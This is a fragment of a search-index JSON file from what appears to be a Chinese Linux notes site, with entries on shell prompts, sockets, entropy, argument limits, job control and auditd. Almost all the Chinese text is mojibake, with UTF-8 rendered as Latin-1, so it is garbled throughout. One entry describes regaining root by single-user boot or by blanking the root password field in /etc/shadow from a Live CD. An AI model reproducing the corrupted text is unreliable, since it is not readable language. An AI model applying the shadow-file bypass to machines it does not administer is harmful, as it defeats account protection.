PS1=\"[\\u@\\h \\w]\\$\" PATH=$PATH:$HOME/bin ä½¿ç”¨exportæŠŠPS1è¾“å‡ºï¼Œä»¥ä½¿å®ƒå¯ä»¥åœ¨å­shellä¸­ç”Ÿæ•ˆ,è¿™ä¼šé€ æˆROOTç”¨æˆ·çš„ä¹Ÿé‡‡ç”¨æ­¤æ ·å¼, export PS1 è¦æ…ç”¨: export PATH unset USERNAME ä¸‹é¢ç®€å•è¯´è¯´ç¯å¢ƒä¸‹é»˜è®¤çš„ç‰¹æ®Šç¬¦å·æ‰€ä»£è¡¨çš„æ„ä¹‰: \\d: ä»£è¡¨æ—¥æœŸï¼Œæ ¼å¼ä¸ºweekday month dateï¼Œä¾‹å¦‚ï¼š\"Mon Aug 1\" \\H: å®Œæ•´çš„ä¸»æœºåç§°ã€‚ä¾‹å¦‚ï¼šæˆ‘çš„æœºå™¨åç§°ä¸ºï¼šfc4.linuxï¼Œåˆ™è¿™ä¸ªåç§°å°±æ˜¯fc4.linux \\h: ä»…å–ä¸»æœºçš„ç¬¬ä¸€ä¸ªåå­—ï¼Œå¦‚ä¸Šä¾‹ï¼Œåˆ™ä¸ºfc4ï¼Œ.linuxåˆ™è¢«çœç•¥ \\t: æ˜¾ç¤ºæ—¶é—´ä¸º24å°æ—¶æ ¼å¼ï¼Œå¦‚ï¼šHHï¼šMMï¼šSS \\T: æ˜¾ç¤ºæ—¶é—´ä¸º12å°æ—¶æ ¼å¼ \\A: æ˜¾ç¤ºæ—¶é—´ä¸º24å°æ—¶æ ¼å¼ï¼šHHï¼šMM \\u: å½“å‰ç”¨æˆ·çš„è´¦å·åç§° \\v: BASHçš„ç‰ˆæœ¬ä¿¡æ¯ \\w: å®Œæ•´çš„å·¥ä½œç›®å½•åç§°ã€‚å®¶ç›®å½•ä¼šä»¥ ~ä»£æ›¿ \\W: åˆ©ç”¨basenameå–å¾—å·¥ä½œç›®å½•åç§°ï¼Œæ‰€ä»¥åªä¼šåˆ—å‡ºæœ€åä¸€ä¸ªç›®å½• \\#: ä¸‹è¾¾çš„ç¬¬å‡ ä¸ªå‘½ä»¤ \\$: æç¤ºå­—ç¬¦ï¼Œå¦‚æœæ˜¯rootæ—¶ï¼Œæç¤ºç¬¦ä¸ºï¼š# ï¼Œæ™®é€šç”¨æˆ·åˆ™ä¸ºï¼š$ æˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®PS1å˜é‡ä½¿æç¤ºç¬¦æˆä¸ºå½©è‰²ã€‚ åœ¨PS1ä¸­è®¾ç½®å­—ç¬¦åºåˆ—é¢œè‰²çš„æ ¼å¼ä¸º: \\[\\e[F;Bm\\] # å…¶å® \\e[Fm å³å¯ # å…¶ä¸­ F ä¸ºå­—ä½“é¢œè‰²ï¼Œç¼–å·30~37ï¼› B ä¸ºèƒŒæ™¯è‰²ï¼Œç¼–å·40~47ã€‚ # å¯é€šè¿‡ \\e[0m å…³é—­é¢œè‰²è¾“å‡ºï¼›ç‰¹åˆ«çš„ï¼Œå½“Bä¸º1æ—¶ï¼Œå°†æ˜¾ç¤ºåŠ äº®åŠ ç²—çš„æ–‡å­—ï¼Œ é¢œè‰²è¡¨ä¸ä»£ç è¡¨è§ /docs/æ“ä½œç³»ç»Ÿ/linux/æ¦‚å¿µæ€§/é¢œè‰²è¡¨ä¸ä»£ç è¡¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-PS1-prompt-definition.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-PS1-prompt-definition.html"},{"title":"å¥—æ¥å­—","text":"å¥—æ¥å­—è¢«å¹¿æ³›åº”ç”¨äºæ‰€æœ‰çš„äº’è”ç½‘é€šä¿¡ï¼Œæ•°æ®åº“å’Œæ“ä½œç³»ç»Ÿæœ¬èº«ã€‚ å®ƒç±»ä¼¼äºå‘½åç®¡é“ï¼ˆFIFOï¼‰å¹¶ä¸”å…è®¸è¿›ç¨‹ä¹‹é—´ç”šè‡³ä¸åŒè®¡ç®—æœºä¹‹é—´è¿›è¡Œä¿¡æ¯äº¤æ¢ã€‚ å¯¹äºå¥—æ¥å­—ï¼Œè¿™äº›è¿›ç¨‹ä¸éœ€è¦åœ¨åŒä¸€æ—¶é—´è¿è¡Œï¼Œä¹Ÿä¸éœ€è¦æ˜¯åŒä¸€ä¸ªçˆ¶è¿›ç¨‹çš„å­è¿›ç¨‹ã€‚ å®ƒæ˜¯ è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰ çš„ä¸€ä¸ªèŠ‚ç‚¹ã€‚ä¿¡æ¯çš„äº¤æ¢å¯èƒ½ä¼šé€šè¿‡ç½‘ç»œå‘ç”Ÿåœ¨ä¸åŒä¸»æœºä¹‹é—´ã€‚ æœ€å¸¸è§çš„ä¸¤ç§æ˜¯ äº’è”ç½‘å¥—æ¥å­— å’Œ UNIXåŸŸå¥—æ¥å­— é€šè¿‡ \"`netstat -an`\" å‘½ä»¤å¯ä»¥å¾ˆæ–¹ä¾¿çš„æŸ¥çœ‹ç³»ç»Ÿå·²ç»æ‰“å¼€äº†å“ªäº›å¥—æ¥å­—","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Puzzle.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Puzzle.html"},{"title":"è®°å½• shell æ´»åŠ¨","text":"shell å‘½ä»¤çš„è¾“å‡ºæœ‰å¯èƒ½æ»šåŠ¨å‡ºäº†å±å¹•ï¼Œ å¹¶å¯èƒ½å¯¼è‡´ä½ æ— æ³•å†æŸ¥çœ‹åˆ°å®ƒã€‚ å°†shellæ´»åŠ¨è®°å½•åˆ°æ–‡ä»¶ä¸­å†æ¥å›é¡¾å®ƒæ˜¯ä¸ªä¸é”™çš„ä¸»æ„ã€‚ å½“ä½ æ‰§è¡Œä»»ä½•ç³»ç»Ÿç®¡ç†ä»»åŠ¡æ—¶ï¼Œè¿™ç§è®°å½•æ˜¯å¿…ä¸å¯å°‘çš„ã€‚ è¿è¡Œ shellã€‚å°è¯•ä¸‹åˆ—ä¾‹å­: $ script Script started, file is typescript åœ¨ script ä¸‹ä½¿ç”¨ä»»ä½• shell å‘½ä»¤ã€‚ æŒ‰ Ctrl-D æ¥é€€å‡º script $ vim typescript","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Record-shell-activity.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Record-shell-activity.html"},{"title":"ç†µ","text":"Linuxå†…æ ¸é‡‡ç”¨ç†µæ¥æè¿°æ•°æ®çš„éšæœºæ€§ã€‚ ç†µï¼ˆentropyï¼‰æ˜¯æè¿°ç³»ç»Ÿæ··ä¹±æ— åºç¨‹åº¦çš„ç‰©ç†é‡ï¼Œ ä¸€ä¸ªç³»ç»Ÿçš„ç†µè¶Šå¤§åˆ™è¯´æ˜è¯¥ç³»ç»Ÿçš„æœ‰åºæ€§è¶Šå·®ï¼Œå³ä¸ç¡®å®šæ€§è¶Šå¤§ã€‚ åœ¨ä¿¡æ¯å­¦ä¸­ï¼Œç†µè¢«ç”¨æ¥è¡¨å¾ä¸€ä¸ªç¬¦å·æˆ–ç³»ç»Ÿçš„ä¸ç¡®å®šæ€§ï¼Œç†µè¶Šå¤§ï¼Œè¡¨æ˜ç³»ç»Ÿæ‰€å«æœ‰ç”¨ä¿¡æ¯é‡è¶Šå°‘ï¼Œä¸ç¡®å®šåº¦è¶Šå¤§ã€‚ è®¡ç®—æœºæœ¬èº«æ˜¯å¯é¢„æµ‹çš„ç³»ç»Ÿï¼Œå› æ­¤ï¼Œç”¨ è®¡ç®—æœºç®—æ³• ä¸å¯èƒ½äº§ç”ŸçœŸæ­£çš„éšæœºæ•°ã€‚ä½†æ˜¯æœºå™¨çš„ç¯å¢ƒä¸­å……æ»¡äº†å„ç§å„æ ·çš„å™ªå£°ï¼Œ å¦‚ç¡¬ä»¶è®¾å¤‡å‘ç”Ÿä¸­æ–­çš„æ—¶é—´ï¼Œç”¨æˆ·ç‚¹å‡»é¼ æ ‡çš„æ—¶é—´é—´éš”ç­‰æ˜¯å®Œå…¨éšæœºçš„ï¼Œ äº‹å…ˆæ— æ³•é¢„æµ‹ã€‚ Linuxå†…æ ¸å®ç°çš„éšæœºæ•°äº§ç”Ÿå™¨æ­£æ˜¯åˆ©ç”¨ç³»ç»Ÿä¸­çš„è¿™äº›éšæœºå™ªå£°æ¥äº§ç”Ÿé«˜è´¨é‡éšæœºæ•°åºåˆ—ã€‚ å†…æ ¸ç»´æŠ¤äº†ä¸€ä¸ªç†µæ± ç”¨æ¥æ”¶é›†æ¥è‡ª è®¾å¤‡é©±åŠ¨ç¨‹åº å’Œå…¶å®ƒæ¥æºçš„ç¯å¢ƒå™ªéŸ³ã€‚ ç†è®ºä¸Šï¼Œç†µæ± ä¸­çš„æ•°æ®æ˜¯å®Œå…¨éšæœºçš„ï¼Œå¯ä»¥å®ç°äº§ç”ŸçœŸéšæœºæ•°åºåˆ—ã€‚ ä¸ºè·Ÿè¸ªç†µæ± ä¸­æ•°æ®çš„éšæœºæ€§ï¼Œå†…æ ¸åœ¨å°†æ•°æ®åŠ å…¥æ± çš„æ—¶å€™å°†ä¼°ç®—æ•°æ®çš„éšæœºæ€§ï¼Œ è¿™ä¸ªè¿‡ç¨‹ç§°ä½œç†µä¼°ç®—ã€‚ç†µä¼°ç®—å€¼æè¿°æ± ä¸­åŒ…å«çš„éšæœºæ•°ä½æ•°ï¼Œå…¶å€¼è¶Šå¤§è¡¨ç¤ºæ± ä¸­æ•°æ®çš„éšæœºæ€§è¶Šå¥½ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-entropy.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-entropy.html"},{"title":"éšæœºæ•°","text":"/dev/randomå’Œ/dev/urandomå…¶å®æ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ manæè¿°çš„ä¸æ˜¯å¾ˆå‡†ç¡® è¯¦ç»†è§: https://zhuanlan.zhihu.com/p/64680713 çœŸä¼ªéšæœºæ˜¯å­˜åœ¨çš„: https://blog.csdn.net/czc1997/article/details/78167705 ä½†æ˜¯linuxçš„/dev/randomå’Œ/dev/urandomä¸çœŸä¼ªå¹¶ä¸å®Œå…¨ä¸€è‡´","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-random-number.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-random-number.html"},{"title":"äºŒè¿›åˆ¶æ•°æ®è®¿é—®","text":"æœ€åŸºç¡€çš„æŸ¥çœ‹äºŒè¿›åˆ¶æ•°æ®çš„æ–¹æ³•æ˜¯ä½¿ç”¨ od -t x1 å‘½ä»¤ã€‚ å‚è€ƒ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/od","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Dual--proof-data-access.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Dual--proof-data-access.html"},{"title":"è·å–æ‰€æœ‰å˜é‡ä¸ç¯å¢ƒå˜é‡","text":"ç¯å¢ƒå˜é‡ envæˆ–export æ‰€æœ‰å˜é‡ set æ³¨è§£ å˜é‡ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ è‹¥ A=B ä¸” B=Cï¼Œè‹¥æˆ‘ä¸‹è¾¾ unset $Aï¼Œåˆ™å–æ¶ˆçš„æ˜¯ä»€ä¹ˆï¼Ÿ å–æ¶ˆçš„æ˜¯Bï¼Œå› ä¸º unset $A ç›¸å½“äº unsetB æ‰€ä»¥å–æ¶ˆçš„æ˜¯Bï¼ŒAä¼šç»§ç»­å­˜åœ¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Get-all-variables-and-environment-variables.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Get-all-variables-and-environment-variables.html"},{"title":"linuxå‚æ•°è¿‡é•¿","text":"å…³äºlinuxå‚æ•°è¿‡é•¿é—®é¢˜ï¼Œ æŸ¥çœ‹å‚æ•°å¯ä»¥ä½¿ç”¨: xargs --show-limits å…¶ä¸­ä¼šæœ‰ä¸€ä¸ªè¿™ä¸ª: Size of command buffer we are actually using: 131072 è¡¨ç¤ºå‘½ä»¤è¡Œå•ä¸ªå‚æ•°é•¿åº¦ä¸èƒ½è¶…è¿‡ 131072 å®é™…æµ‹è¯• æœ€å¤§åªèƒ½åˆ° 131071: /bin/echo `python -c \"print '.'*131071\"` ä¸€äº›æ–‡ç« å‚è€ƒ:: python â€“ ä¸ºä»€ä¹ˆsubprocess.Popenå‚æ•°é•¿åº¦é™åˆ¶... Linux command line character limit ã€Linuxã€‘ã€ç¼–è¯‘ç›¸å…³ã€‘execvp: /bin/sh: Argument list too longé—®é¢˜å¤„ç†å°ç»“ What defines the maximum size for a command single argument? Unix / Linux: Maximum Character Length of Arguments In a Shell Command","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-LINUX-parameter-is-too-long.html","loc":"/yq-doc-source-docs-operating-system-linux-question-LINUX-parameter-is-too-long.html"},{"title":"è¿›ç¨‹æš‚åœä¸æŒ‚èµ·","text":"åœ¨macosä¸ŠéªŒè¯ ctrl + z æš‚åœè¿›ç¨‹ æ¢å¤ jobs æŸ¥çœ‹æœ‰å“ªäº›è¿›ç¨‹è¢«æš‚åœ bg %N ä½¿ç¬¬Nä¸ªä»»åŠ¡åœ¨åå°è¿è¡Œï¼ˆ%å‰æœ‰ç©ºæ ¼ï¼‰ fg %N ä½¿ç¬¬Nä¸ªä»»åŠ¡åœ¨å‰å°è¿è¡Œ jg %n æŒ‚èµ·è¢«æš‚åœçš„è¿›ç¨‹ï¼Œnä¸ºè¿›ç¨‹åºå· æ³¨è§£ é»˜è®¤bgï¼Œfgä¸å¸¦%Næ—¶è¡¨ç¤ºå¯¹æœ€åä¸€ä¸ªè¿›ç¨‹æ“ä½œï¼ ç›¸å…³æŒ‡ä»¤: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/jobs /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/bg è½¬åå°æ‰§è¡Œ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/fg æ¢å¤æ‰§è¡Œ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Process-pause-and-hanging.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Process-pause-and-hanging.html"},{"title":"rootå¯†ç å¿˜è®°","text":"æŸ¥çœ‹ /etc/shadow ä½¿ç”¨çš„åŠ å¯†æœºåˆ¶: authconfig --test | grep hashing æ–¹æ³•ä¸€ é‡å¯è¿›å…¥å•äººç»´æŠ¤æ¨¡å¼ï¼Œç³»ç»Ÿä¼šä¸»åŠ¨ç»™äºˆ root æƒé™çš„ bash æ¥å£ï¼Œ ç„¶å passwd ä¿®æ”¹ æ–¹æ³•äºŒ ä»¥ Live CD å¼€æœºåæŒ‚è½½æ ¹ç›®å½•å»ä¿®æ”¹ /etc/shadowï¼Œå°†é‡Œé¢çš„ root å¯†ç å­—æ®µæ¸…ç©º æ–¹æ³•ä¸‰ å¦‚æœæ™®é€šç”¨æˆ·æœ‰sudoçš„passwdæƒé™ï¼Œé‚£ä¹ˆç›´æ¥ sudo passwdå³å¯","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Root-password-forgotten.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Root-password-forgotten.html"},{"title":"å•æ¬¡ä»»åŠ¡","text":"å³ä¸€æ¬¡æ€§ä»»åŠ¡ è¿è¡Œ at å‘½ä»¤æ¥å®‰æ’ä¸€æ¬¡æ€§çš„å·¥ä½œ: $ echo 'command -args'| at 3:40 monday","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Single-task.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Single-task.html"},{"title":"Linuxçš„ä¸€äº›å†…æ ¸å‚æ•°","text":"é—®é¢˜èƒŒæ™¯: execvp: /bin/sh: Argument list too long é—®é¢˜å‡ºç°çš„ä¸¤ç§æƒ…å†µï¼š makeçš„æ—¶å€™ï¼Œå¦‚ç¼–è¯‘Linuxå†…æ ¸ã€é©±åŠ¨ã€Androidç‰ˆæœ¬ç­‰è¾ƒé•¿-Iã€-Dé€‰é¡¹çš„æƒ…å†µï¼› shellæ“ä½œï¼Œæ¶‰åŠè¾ƒå¤šæ–‡ä»¶çš„æƒ…å†µï¼Œå¦‚åˆ é™¤å¤§é‡æ–‡ä»¶æ—¶ï¼Œç›´æ¥ç”¨rmï¼› é—®é¢˜åŸå›  é”™è¯¯æ¥æºäºsysdeps/gnu/errlist.cæ–‡ä»¶ä¸­: [ERR_REMAP (E2BIG)] = N_(\"Argument list too long\"), å¯æ®æ­¤æ‰¾åˆ°å¯¹åº”Linuxå†…æ ¸ä¸­exec.cä¸­è¿”å›E2BIGçš„åœ°æ–¹ï¼Œå®é™…å’ŒARG_MAXæœ‰å¾ˆå¤§å…³ç³»ã€‚ å‚è€ƒAPUEï¼ŒARG_MAXçš„å€¼åœ¨è¿è¡Œæ—¶é—´ä¸å˜çš„å€¼ï¼Œä½†å€¼å¯èƒ½ä¸ç¡®å®šã€‚ ARG_MAXçš„å€¼å®é™…ä¸Šå’Œä¸‹é¢å‚æ•°æœ‰å…³ç³» MAX_ARG_STRLEN #å•ä¸ªå­—ç¬¦ä¸²çš„æœ€å¤§å¤§å° MAX_ARG_STRINGS #å‚æ•°ä¸ªæ•°çš„é™åˆ¶ MAX_ARG_PAGES #åˆ†é…ç»™å‚æ•°çš„æœ€å¤§é¡µæ•° stack size #å †æ ˆç©ºé—´ ARG_MAX in limits.h #å‚æ•°çš„æœ€å¤§é•¿åº¦ å®é™…ä¸Šï¼Œä¸åŒå†…æ ¸çš„ç‰ˆæœ¬ä¹Ÿæœ‰åŒºåˆ«ã€‚ å‡ ä¸ªå‘½ä»¤æ‰§è¡Œæƒ…å†µçš„ä¾‹å­: [qxhgd@localhost]getconf ARG_MAX 2897152 [qxhgd@localhost]ulimit -s 8192 [qxhgd@localhost]xargs --show-limits Your environment variables take up 4222 bytes POSIX upper limit on argument length (this system): 2090882 POSIX smallest allowable upper limit on argument length (all systems): 4096 Maximum length of command we could actually use: 2086660 Size of command buffer we are actually using: 131072 å‚è€ƒ: https://blog.csdn.net/qxhgd/article/details/115472297","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Some-kernel-parameters-of-Linux.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Some-kernel-parameters-of-Linux.html"},{"title":"è°åœ¨ç³»ç»Ÿ","text":"ä½ å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•æ£€æŸ¥è°ç™»å½•åœ¨ç³»ç»Ÿé‡Œã€‚ who æ˜¾ç¤ºè°ç™»å½•åœ¨ç³»ç»Ÿé‡Œé¢ã€‚ w æ˜¾ç¤ºè°ç™»å½•åœ¨ç³»ç»Ÿé‡Œé¢ï¼Œä»–ä»¬æ­£åœ¨åœ¨åšä»€ä¹ˆã€‚ last æ˜¾ç¤ºç”¨æˆ·æœ€åç™»å½•çš„åˆ—è¡¨ã€‚ lastb æ˜¾ç¤ºç”¨æˆ·æœ€åé”™è¯¯ç™»å½•çš„åˆ—è¡¨ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Who-is-in-the-system.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Who-is-in-the-system.html"},{"title":"ACLæƒé™æ§åˆ¶","text":"æŸ¥çœ‹aclæƒé™: getfacle $filename å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/getfacle è®¾ç½®aclæƒé™: setfacle é€‰é¡¹ æ–‡ä»¶å å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/setfacle å‚è€ƒåœ°å€: http://c.biancheng.net/view/863.html","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-ACL-permission-control.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-ACL-permission-control.html"},{"title":"auditd-ç³»ç»Ÿå®¡è®¡","text":"auditd The Linux Audit Subsystem is a system to Collect information regarding events occurring on the system(s) , Kernel events (syscall events), User events (audit-enabled programs) syslogè®°å½•çš„ä¿¡æ¯æœ‰é™ï¼Œä¸»è¦ç›®çš„æ˜¯è½¯ä»¶è°ƒè¯•ï¼Œè·Ÿè¸ªå’Œæ‰“å°è½¯ä»¶çš„è¿è¡ŒçŠ¶æ€ï¼Œè€Œauditçš„ç›®çš„åˆ™ä¸åŒï¼Œ å®ƒæ˜¯linuxå®‰å…¨ä½“ç³»çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œæ˜¯ä¸€ç§\"è¢«åŠ¨\"çš„é˜²å¾¡ä½“ç³»ã€‚ åœ¨å†…æ ¸é‡Œæœ‰å†…æ ¸å®¡è®¡æ¨¡å—ï¼Œè®°å½•ç³»ç»Ÿä¸­çš„å„ç§åŠ¨ä½œå’Œäº‹ä»¶ï¼Œæ¯”å¦‚ç³»ç»Ÿè°ƒç”¨ï¼Œæ–‡ä»¶ä¿®æ”¹ï¼Œæ‰§è¡Œçš„ç¨‹åºï¼Œ ç³»ç»Ÿç™»å…¥ç™»å‡ºå’Œè®°å½•æ‰€æœ‰ç³»ç»Ÿä¸­æ‰€æœ‰çš„äº‹ä»¶ï¼Œå®ƒçš„ä¸»è¦ç›®çš„æ˜¯æ–¹ä¾¿ç®¡ç†å‘˜æ ¹æ®æ—¥è®°å®¡è®¡ç³»ç»Ÿæ˜¯å¦å…è®¸æœ‰å¼‚å¸¸ï¼Œ æ˜¯å¦æœ‰å…¥ä¾µç­‰ç­‰ï¼Œè¯´ç©¿äº†å°±æ˜¯æŠŠå’Œç³»ç»Ÿå®‰å…¨æœ‰å…³çš„äº‹ä»¶è®°å½•ä¸‹æ¥ã€‚ auditd æ˜¯Linuxå®¡è®¡ç³»ç»Ÿçš„ç”¨æˆ·ç©ºé—´ç»„ä»¶ï¼Œå®ƒè´Ÿè´£å°†å®¡è®¡è®°å½•å†™å…¥ç£ç›˜ã€‚ æŸ¥çœ‹æ—¥å¿—ä½¿ç”¨ ausearch æˆ– aureport å®ç”¨ç¨‹åºå®Œæˆã€‚ ä½¿ç”¨ auditctl å®ç”¨ç¨‹åºé…ç½®å®¡æ ¸ç³»ç»Ÿæˆ–åŠ è½½è§„åˆ™ã€‚ åœ¨ auditd å¯åŠ¨æœŸé—´ï¼Œ /etc/audit/audit.rules ä¸­çš„å®¡è®¡è§„åˆ™ç”± auditctl è¯»å–å¹¶åŠ è½½åˆ°å†…æ ¸ä¸­ã€‚ æˆ–è€…è¿˜æœ‰ä¸€ä¸ª augenrules ç¨‹åºï¼Œè¯»å– /etc/audit/rules.d/ ä¸­çš„è§„åˆ™å¹¶å°†å…¶ç¼–è¯‘æˆ audit.rules å®¡è®¡è§„åˆ™æ–‡ä»¶ä¸­ã€‚ å®¡è®¡å®ˆæŠ¤è¿›ç¨‹æœ¬èº« æœ‰ä¸€äº›é…ç½®é€‰é¡¹å¯ä»¥è®©ç®¡ç†å‘˜è¿›è¡Œè‡ªå®šä¹‰é…ç½® auditå¯ä»¥ç”¨æ¥å¹²ä»€ä¹ˆ Watching file access Monitoring system calls Recording commands run by a user Recording security events Monitoring network access æ€ä¹ˆå¼€å¯audit é¦–å…ˆå†…æ ¸éœ€è¦æ‰“å¼€ CONFIG_AUDIT çš„é…ç½®ï¼Œåœ¨æ‰“å¼€äº†é…ç½®é‡æ–°ç¼–è¯‘å†…æ ¸åï¼Œ auditåŠŸèƒ½é»˜è®¤æ˜¯å…³é—­çš„ï¼Œæœ‰ä¸¤ç§æ–¹æ³•åœ¨ä½¿èƒ½audit: cmdlineä¸­åŠ å…¥audit= 1å‚æ•°ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°è®¾ç½®ä¸º1ï¼Œè€Œä¸”auditdæ²¡æœ‰è¿è¡Œï¼Œåˆ™å®¡è®¡æ—¥å¿—ä¼šè¢«å†™åˆ°/var/log/messagesä¸­ã€‚ ä½¿ç”¨å®ˆæŠ¤è¿›ç¨‹auditd è¯¦è§ https://blog.csdn.net/whuzm08/article/details/87267956 auditdç›¸å…³å·¥å…·ä¸é…ç½®æ–‡ä»¶ auditctl å³æ—¶æ§åˆ¶å®¡è®¡å®ˆæŠ¤è¿›ç¨‹çš„è¡Œä¸ºçš„å·¥å…·ï¼Œæ¯”å¦‚å¦‚æ·»åŠ è§„åˆ™ç­‰ç­‰ aureport æŸ¥çœ‹å’Œç”Ÿæˆå®¡è®¡æŠ¥å‘Šçš„å·¥å…· ausearch æŸ¥æ‰¾å®¡è®¡äº‹ä»¶çš„å·¥å…· auditspd è½¬å‘äº‹ä»¶é€šçŸ¥ç»™å…¶ä»–åº”ç”¨ç¨‹åºï¼Œè€Œä¸æ˜¯å†™å…¥åˆ°å®¡è®¡æ—¥å¿—æ–‡ä»¶ä¸­ autrace ä¸€ä¸ªç”¨äºè·Ÿè¸ªè¿›ç¨‹çš„å‘½ä»¤ /etc/audit/auditd.conf auditdå·¥å…·çš„é…ç½®æ–‡ä»¶ /etc/audit/rules.d/audit.rules åŒ…å«å®¡æ ¸è§„åˆ™çš„æ–‡ä»¶ /etc/audit/audit.rules è®°å½•å®¡è®¡è§„åˆ™çš„æ–‡ä»¶ é…ç½®å­—æ®µçš„å«ä¹‰ type=SYSCALL æ¯æ¡è®°å½•éƒ½æ˜¯ä»¥type=\"keyword\"å¼€å¤´ï¼Œ SYSCALLè¡¨ç¤ºè¿™æ¡è®°å½•æ˜¯å‘å†…æ ¸çš„ç³»ç»Ÿè°ƒç”¨è§¦å‘äº§ç”Ÿçš„ã€‚ æ›´è¯¦ç»†çš„typeå€¼å’Œè§£é‡Šå¯ä»¥å‚è€ƒ: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/sec-Audit_Record_Types msg=audit(1523501777.709:4172989316) åœ¨audit(time_stamp:ID)æ ¼å¼ä¸­ï¼Œè®°å½•æ—¶é—´æˆ³ï¼Œä»1970å¹´1æœˆ1æ—¥00:00:00åˆ°ç°åœ¨çš„æ—¶é—´ï¼Œ IDä¸ºè®°å½•ä¸­å”¯ä¸€çš„IDæ ‡è¯†ï¼ŒåŒä¸€ä¸ªäº‹ä»¶äº§ç”Ÿçš„IDæ˜¯ç›¸åŒçš„ï¼Œ å¦‚ä¸Šè®¿é—®audit_testç›®å½•ä¼šè§¦å‘äº§ç”Ÿä¸‰æ¡æ—¥å¿—ï¼Œä½†æ˜¯äº‹ä»¶IDæ˜¯ç›¸åŒçš„ã€‚ arch=c000003e è¡¨ç¤ºç³»ç»Ÿçš„CPUæ¶æ„ï¼Œè¿™ä¸ªåå…­è¿›åˆ¶è¡¨ç¤º\"x86_64\"ï¼Œ ä½¿ç”¨å‘½ä»¤ ausearch -i --arch c000003e å¯ä»¥æ‰“å°å‡ºæœ‰è¿™éƒ¨åˆ†å†…å®¹çš„audit.logä¸­æ—¥å¿—çš„è§£é‡Šã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ausearchæ¥æŸ¥è¯¢æ—¶ï¼Œéœ€è¦ä¿è¯audit logä¸­æœ‰è¿™æ ·çš„æ—¥å¿—è®°å½•ã€‚ syscall=257 å‘å†…æ ¸çš„ç³»ç»Ÿè°ƒç”¨çš„ç±»å‹ï¼Œç±»å‹å€¼ä¸º257ï¼Œåœ¨/usr/include/asm/unistd_64.hä¸­æœ‰å®šä¹‰ï¼Œ è¿™é‡Œ257è¡¨ç¤ºopenatï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ausyscallæ¥æŸ¥è¯¢ä¸åŒçš„æ•°å­—å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨åç§°ã€‚ æˆ–è€…ä½¿ç”¨ ausyscall --dump å‘½ä»¤æ¥æ˜¾ç¤ºæ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨: # ausyscall 257 openat # ausyscall --dump Using x86_64 syscall table: 0 read 1 write 2 open success=yes è¡¨ç¤ºç³»ç»Ÿè°ƒç”¨æˆåŠŸä¸å¦ exit=3 ç³»ç»Ÿè°ƒç”¨ç»“æŸæ—¶çš„è¿”å›ç ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹è¿”å›å€¼ä¸º3çš„æ—¥å¿—è§£é‡Šï¼Œä¸åŒçš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¿”å›å€¼ä¸åŒ: #ausearch --interpret --exit 3 a0=ffffffffffffff9c a1=21e0550 a2=90800 a3=0 